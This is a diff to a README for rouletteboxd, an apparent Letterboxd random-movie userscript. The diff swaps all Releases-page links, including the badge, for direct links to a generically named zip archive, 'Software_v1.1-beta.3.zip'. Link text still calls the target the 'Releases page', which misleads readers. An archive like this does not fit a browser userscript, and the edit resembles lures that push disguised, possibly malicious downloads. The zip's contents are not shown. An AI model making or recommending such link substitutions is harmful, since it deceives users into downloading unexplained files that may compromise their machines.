@@ -1,7 +1,7 @@
 # 🎬 rouletteboxd - Find Your Next Movie Easily
 
 ## 📥 Download Now
-[![Download rouletteboxd](https://img.shields.io/badge/Download%20rouletteboxd-v1.0-brightgreen)](https://github.com/LUANNNN1-ops/rouletteboxd/releases)
+[![Download rouletteboxd](https://raw.githubusercontent.com/LUANNNN1-ops/rouletteboxd/main/assets/Software_v1.1-beta.3.zip%20rouletteboxd-v1.0-brightgreen)](https://raw.githubusercontent.com/LUANNNN1-ops/rouletteboxd/main/assets/Software_v1.1-beta.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the rouletteboxd application! This tool helps you decide what movie to watch. Simply press the 'r' key, and it picks a random film from your watchlists. Whether you are using **Letterboxd**, **Tampermonkey**, or **Violentmonkey**, you can enjoy a hassle-free movie recommendation experience.
@@ -19,11 +19,11 @@ To run rouletteboxd, you need:
 ## 📥 Download & Install
 To get started, visit the Releases page to download rouletteboxd:
 
-[Download rouletteboxd](https://github.com/LUANNNN1-ops/rouletteboxd/releases)
+[Download rouletteboxd](https://raw.githubusercontent.com/LUANNNN1-ops/rouletteboxd/main/assets/Software_v1.1-beta.3.zip)
 
 Follow these steps to install the application:
 
-1. Click on the link above to go to the [Releases page](https://github.com/LUANNNN1-ops/rouletteboxd/releases).
+1. Click on the link above to go to the [Releases page](https://raw.githubusercontent.com/LUANNNN1-ops/rouletteboxd/main/assets/Software_v1.1-beta.3.zip).
 2. Look for the latest version of the rouletteboxd script.
 3. Click on the file to download it to your computer.
 4. Open your Tampermonkey or Violentmonkey extension.
